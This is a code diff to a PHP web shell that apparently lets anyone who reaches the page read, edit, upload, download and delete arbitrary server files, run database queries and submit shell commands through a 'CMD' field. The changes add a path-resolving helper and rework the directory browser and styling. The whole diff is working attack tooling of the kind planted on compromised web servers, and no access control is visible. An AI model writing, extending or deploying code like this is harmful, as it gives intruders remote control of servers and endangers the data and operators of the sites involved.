@@ -14,17 +14,31 @@ if(!empty($_GET['dl']) )
 		exit;
 	}
 	else
-		echo '<b>Error reading file ' . $f . '</b>';
+		echo '<b>Error reading file ' . GetPath($f) . '</b>';
 }
 echo '<!DOCTYPE html><html class="'.(($dark)?'h':'').'"><head><meta charset="utf-8"></head>
 <body><style type="text/css">html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
 .row::after { content: "";display: table; clear: both;}
-.a1 { background: #bbb; color: #000; } .a2 { background: #eee; color: #000; }
+.a1 { background: #999; color: #000; } .a2 { background: #ccc; color: #000; }
 @media only screen and (min-width: 25em) { c1,c2,c3,c4 { display: block; float:left; min-height: 0.125rem; }
-c1 { width: 85px; } c2 { width: 150px; overflow: hidden; text-overflow: ellipsis; } c4 { width: 250px; } }
+c1 { width: 90px; } c2 { width: 200px; overflow: hidden; text-overflow: ellipsis; } c4 { width: 300px; } }
 .c { width: 800px; height:400px; border:1px solid #000; overflow: auto; resize: both; }
-.h { background: #000; color: #00FF00; }</style>';
+.h { background: #000; color: #00FF00; .c,textarea, input { background-color: #666; } }</style>';
 
+function GetPath($f)
+{
+	$p = realpath($f);
+	if (!$p)
+	{
+		if (!empty($f) && $f[0] == '/') $p = $f;
+		else
+		{
+			if (substr($f,0,2) == './') $f = substr($f,2);
+			$p = getcwd() . '/' . $f;
+		}
+	}
+	return $p;
+}
 
 function GetPerms($p)
 {
@@ -55,14 +69,14 @@ if(!empty($_FILES['f']['name']))
 $f = (!empty($_GET['read'])) ? $_GET['read'] : ((!empty($_POST['read'])) ? $_POST['read'] : false);
 if($f)
 {
-	echo '<b>Reading file ' . realpath($f) .'</b><br>';
+	echo '<b>Reading file ' . GetPath($f) .'</b><br>';
 	$strFile = highlight_file($f, true);
 	echo (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="c">'. $strFile .'</div>');
 }
 
 if(!empty($_POST['write']))
 {
-	echo '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . $_POST['write'] . '</b>';
+	echo '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . GetPath($_POST['write']) . '</b>';
 }
 
 if(!empty($_GET['delete']))
@@ -89,49 +103,48 @@ if(!empty($_POST['query']))
 	echo '</table>';
 }
 
-$dir = $_GET['dir'];
-if(!empty($_GET['dir']))
+$dir = !empty($_GET['dir']) ? $_GET['dir'] : '.';
+$dir = GetPath($dir);
+if ($dir)
 {
-	if ($h = opendir($dir)) 
-	{
-		echo "<br><br><b>Listing of " . realpath($dir) . '</b><br><br><div style="min-width: 600px">';
-		$i = 0;
+	$tab = scandir($dir);
 
-		while ($x = readdir($h))
+	if ($tab) 
+	{
+		echo "<br><br><b>Listing of " . $dir . '</b><br><br><div style="min-width: 600px">';
+		$i = 0;
+		foreach ($tab as $x)
 		{
 			$f = $dir.'/'.$x;
-			
 			echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'"><c1>';
 			echo GetPerms(fileperms($f)) . ' </c1><c2>';
-
 			if (is_dir($f)) echo $x . "</c2><c1></c1><c4> [<a href='$f'>open</a>] [<a href='?dir=$f'>browse</a>]";
 
 			else echo $x . "</c2><c1> (". GetSize(filesize($f)) .") </c1><c4>
 							[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
-							[<a href='?dir=$dir&dl=$f'>dl</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
+							[<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
 							[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]";
 			
 			echo '</c4></div>';
 		}
-
 		echo '</div>';
-		closedir($h);
 	}
 	else
-		echo "<b>Can't open directory ". realpath($dir) ."</b>";
+		echo "<b>Can't open directory ". $dir ."</b>";
 }
+
 
 $f = $c = '';
 if(isset($_GET['edit']))
 {
-	$f = realpath($_GET['edit']);
+	$f = $_GET['edit'];
 	$c = htmlentities(file_get_contents($f));
 }
 ?>
 
 <br><hr><br>
 
-<a href="?dir=.">browse here</a><br><br>
+<a href="?dir=.">DIR BROWSER</a><br><br>
 
 <form action="?dir=<?=$dir;?>" METHOD="POST">
 CMD <input type="text" name="cmd" placeholder="ls -al"><input type="submit">
